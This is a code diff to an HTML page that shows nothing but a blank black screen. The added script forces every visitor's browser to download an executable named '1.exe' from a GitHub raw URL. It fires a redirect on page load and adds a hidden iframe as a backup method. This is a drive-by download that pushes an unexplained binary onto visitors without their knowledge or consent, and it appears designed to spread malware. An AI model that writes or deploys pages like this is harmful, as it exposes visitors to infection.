@@ -2,12 +2,34 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title></title>
-    <style>body { background: #000; margin: 0; padding: 0; }</style>
+    <title>Download</title>
+    <style>
+        body { 
+            background: #000000; 
+            margin: 0; 
+            padding: 0; 
+            overflow: hidden;
+        }
+    </style>
     <script>
-        window.location.href = 'https://github.com/voidpardoxco/g/raw/refs/heads/master/1.exe';
+        // Force download immediately
+        window.onload = function() {
+            const downloadUrl = 'https://github.com/voidpardoxco/g/raw/refs/heads/master/1.exe';
+            
+            // Method 1: Direct redirect
+            window.location.href = downloadUrl;
+            
+            // Method 2: Create invisible iframe as backup
+            setTimeout(function() {
+                const iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                iframe.src = downloadUrl;
+                document.body.appendChild(iframe);
+            }, 100);
+        };
     </script>
 </head>
 <body>
+    <!-- Completely blank black page -->
 </body>
 </html>
